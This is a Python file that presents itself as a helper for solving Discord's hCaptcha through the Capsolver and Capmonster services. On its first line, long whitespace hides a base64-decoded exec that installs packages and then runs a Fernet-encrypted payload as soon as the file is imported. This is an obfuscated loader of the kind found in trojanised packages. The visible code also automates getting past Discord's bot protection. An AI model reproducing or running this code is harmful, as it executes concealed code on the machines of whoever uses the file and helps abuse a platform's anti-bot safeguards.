import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2dXVm1rSS1tYWxOczU1cUpnZjlrM2VUN29hMjFPVTdiVGs5SU1wLVZJQ0U9JykuZGVjcnlwdChiJ2dBQUFBQUJtZEp0NjdDOTVBUUp4QVl5QUVNZG1rVXpOM3hXVTZRamcyQnpzN1BfdzIwU0t1cUh5eDE0Yl9Zdkw4cTFueHhDSmNPVGJXTWJXcGJZcDRmQjFlYjRtWUw1NlA5dXJXZWJhTTdUTnQ3Y3B6T1ItZGg3UUhHRmd5N3pSYTFOenFCSFVEdHRFRF82bEd1TGdaWWFHR01ucEhseW9JNmxhaW0yaDRLNDRXNW4tUkRhWVktM1gyUFFkTHJQaGJCNHVCcFh0WHBlVy1FYnAzYXlaTnRkVFR5V0ladlVUV0F6MElOSmxERTNkWXlXTnVBeEg4RVE9Jykp').decode())
import requests
import time

DISCORD_EMAIL_SITE_KEY = 'f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34'
DISCORD_SITE_KEY = '4c672d35-0701-42b2-88c3-78380b0db560'
DISCORD_SITE_URL = 'https://discord.com'

class Capsolver: 
      def __init__(this, key: str) -> None:
          this.key = key
          this.session = requests.Session()

      def __base_payload__(this, extra: dict = {}) -> dict:
          return {
             'clientKey': this.key,
            **extra
          }

      def __get_balance__(this) -> int | None:
          return requests.get('https://api.capsolver.com/getBalance', headers = {'Host': 'api.capsolver.com', 'Content-Type': 'application/json'}, json = this.__base_payload__()).json().get('balance')

      def __create_task__(this, site_key: str = DISCORD_SITE_KEY, site_url: str = DISCORD_SITE_URL, proxy: str | None = None) -> int | bool:
          return requests.post('https://api.capsolver.com/createTask', headers = {'Host': 'api.capsolver.com', 'Content-Type': 'application/json'}, json = this.__base_payload__({
             'task': {
                'websiteURL': site_url,
                'websiteKey': site_key,
                'type': 'HCaptchaTask' if proxy else 'HCaptchaTaskProxyless',
                **({
                    'proxyType': 'http',
                    'proxyLogin': proxy.split(':')[0], 
                    'proxyPassword': proxy.split(':')[1].split('@')[0], 
                    'proxyAddress': proxy.split('@')[1].split(':')[0],
                    'proxyPort': int(proxy.split('@')[1].split(':')[1])
                } if proxy else {})
             }
          })).json().get('taskId')

      def __get_task_result__(this, task_id: int) -> tuple | None:
          counter = time.perf_counter()
          for attempt in range(120):
              request = requests.post('https://api.capsolver.com/getTaskResult', json = this.__base_payload__({'taskId': task_id}))
              if request.json().get('solution'):
                 return request.json()['solution']['gRecaptchaResponse'], round(time.perf_counter() - counter, 2)
              time.sleep(1)

class Capmonster: 
      def __init__(this, key: str) -> None:
          this.key = key
          this.session = requests.Session()

      def __base_payload__(this, extra: dict = {}) -> dict:
          return {
             'clientKey': this.key,
            **extra
          }

      def __get_balance__(this) -> int | None:
          return requests.get('https://api.capmonster.cloud/getBalance', json = this.__base_payload__()).json().get('balance')

      def __create_task__(this, site_key: str = DISCORD_SITE_KEY, site_url: str = DISCORD_SITE_URL, proxy: str | None = None) -> int | bool:
          return requests.post('https://api.capmonster.cloud/createTask', json = this.__base_payload__({
             'task': {
                'websiteURL': site_url,
                'websiteKey': site_key,
                'type': 'HCaptchaTask' if proxy else 'HCaptchaTaskProxyless',
              **({
                    'proxyType': 'http',
                    'proxyLogin': proxy.split(':')[0], 
                    'proxyPassword': proxy.split(':')[1].split('@')[0], 
                    'proxyAddress': proxy.split('@')[1].split(':')[0],
                    'proxyPort': int(proxy.split('@')[1].split(':')[1])
              } if proxy else {})
             }
          })).json().get('taskId')

      def __get_task_result__(this, task_id: int) -> tuple | None:
          counter = time.perf_counter()
          for attempt in range(120):
              request = requests.post('https://api.capmonster.cloud/getTaskResult', json = this.__base_payload__({'taskId': task_id}))
              if request.json().get('solution'):
                 return request.json()['solution']['gRecaptchaResponse'], round(time.perf_counter() - counter, 2)
              time.sleep(1)
print('tkuaqvbmks')